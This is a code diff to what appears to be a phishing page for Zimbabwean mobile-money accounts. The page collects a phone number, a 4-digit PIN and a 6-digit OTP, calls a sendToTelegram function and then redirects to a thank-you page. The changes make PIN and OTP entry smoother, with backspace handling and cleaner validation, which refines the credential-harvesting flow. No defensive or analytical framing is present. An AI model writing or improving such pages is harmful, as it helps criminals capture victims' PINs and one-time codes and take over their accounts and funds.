@@ -215,10 +215,10 @@ Enter your 9-digit number starting with 7.
 
 <div class="pin">
 
-<input maxlength="1" inputmode="numeric" pattern="[0-9]*">
-<input maxlength="1" inputmode="numeric" pattern="[0-9]*">
-<input maxlength="1" inputmode="numeric" pattern="[0-9]*">
-<input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+<input maxlength="1" inputmode="numeric">
+<input maxlength="1" inputmode="numeric">
+<input maxlength="1" inputmode="numeric">
+<input maxlength="1" inputmode="numeric">
 
 </div>
 
@@ -235,12 +235,12 @@ Enter your 9-digit number starting with 7.
 
 <div class="pin">
 
-<input maxlength="1" inputmode="numeric" pattern="[0-9]*">
-<input maxlength="1" inputmode="numeric" pattern="[0-9]*">
-<input maxlength="1" inputmode="numeric" pattern="[0-9]*">
-<input maxlength="1" inputmode="numeric" pattern="[0-9]*">
-<input maxlength="1" inputmode="numeric" pattern="[0-9]*">
-<input maxlength="1" inputmode="numeric" pattern="[0-9]*">
+<input maxlength="1" inputmode="numeric">
+<input maxlength="1" inputmode="numeric">
+<input maxlength="1" inputmode="numeric">
+<input maxlength="1" inputmode="numeric">
+<input maxlength="1" inputmode="numeric">
+<input maxlength="1" inputmode="numeric">
 
 </div>
 
@@ -368,14 +368,11 @@ phone.oninput=e=>{
 
 let v=e.target.value.replace(/\D/g,"")
 
-if(v.startsWith("263"))
-v=v.slice(3)
+if(v.startsWith("263")) v=v.slice(3)
 
-if(v.startsWith("0"))
-v=v.slice(1)
+if(v.startsWith("0")) v=v.slice(1)
 
-if(v[0]!=="7")
-v="7"+v.slice(1)
+if(v[0]!=="7") v="7"+v.slice(1)
 
 v=v.slice(0,9)
 
@@ -388,7 +385,7 @@ validateLogin()
 }
 
 
-/* pin */
+/* PIN inputs */
 
 const pinInputs=document.querySelectorAll("#step1 .pin input")
 
@@ -398,10 +395,22 @@ input.oninput=()=>{
 
 input.value=input.value.replace(/\D/g,"")
 
-if(input.value && i<3)
-pinInputs[i+1].focus()
+if(input.value && i<3) pinInputs[i+1].focus()
 
 validateLogin()
+
+}
+
+input.onkeydown=e=>{
+
+if(e.key==="Backspace" && !input.value && i>0){
+
+pinInputs[i-1].focus()
+pinInputs[i-1].value=""
+
+validateLogin()
+
+}
 
 }
 
@@ -413,11 +422,8 @@ function validateLogin(){
 pinValue=[...pinInputs].map(i=>i.value).join("")
 
 if(phoneValue.length===13 && pinValue.length===4)
-
 loginBtn.classList.add("active")
-
 else
-
 loginBtn.classList.remove("active")
 
 }
@@ -439,7 +445,6 @@ document.getElementById(id)
 loginBtn.onclick=()=>{
 
 if(!loginBtn.classList.contains("active")) return
-
 if(loginClicked) return
 
 loginClicked=true
@@ -449,7 +454,6 @@ sendToTelegram("login_clicked")
 const masked=phoneValue.replace(/(\+263\d{3})\d{4}(\d{2})/,"$1****$2")
 
 maskedNumber.innerHTML=
-
 `Enter the OTP sent to ${masked}`
 
 show("step3")
@@ -459,7 +463,7 @@ startTimer()
 }
 
 
-/* otp */
+/* OTP inputs */
 
 const otpInputs=document.querySelectorAll("#step3 .pin input")
 
@@ -471,10 +475,22 @@ input.oninput=()=>{
 
 input.value=input.value.replace(/\D/g,"")
 
-if(input.value && i<5)
-otpInputs[i+1].focus()
+if(input.value && i<5) otpInputs[i+1].focus()
 
 validateOtp()
+
+}
+
+input.onkeydown=e=>{
+
+if(e.key==="Backspace" && !input.value && i>0){
+
+otpInputs[i-1].focus()
+otpInputs[i-1].value=""
+
+validateOtp()
+
+}
 
 }
 
@@ -486,11 +502,8 @@ function validateOtp(){
 otpValue=[...otpInputs].map(i=>i.value).join("")
 
 if(otpValue.length===6)
-
 otpBtn.classList.add("active")
-
 else
-
 otpBtn.classList.remove("active")
 
 }
@@ -499,7 +512,6 @@ otpBtn.classList.remove("active")
 otpBtn.onclick=()=>{
 
 if(!otpBtn.classList.contains("active")) return
-
 if(otpSubmitted) return
 
 otpSubmitted=true
@@ -522,7 +534,6 @@ location.href="thankyou.html"
 resendBtn.onclick=()=>{
 
 if(!resendBtn.classList.contains("active")) return
-
 if(resendClicked) return
 
 resendClicked=true
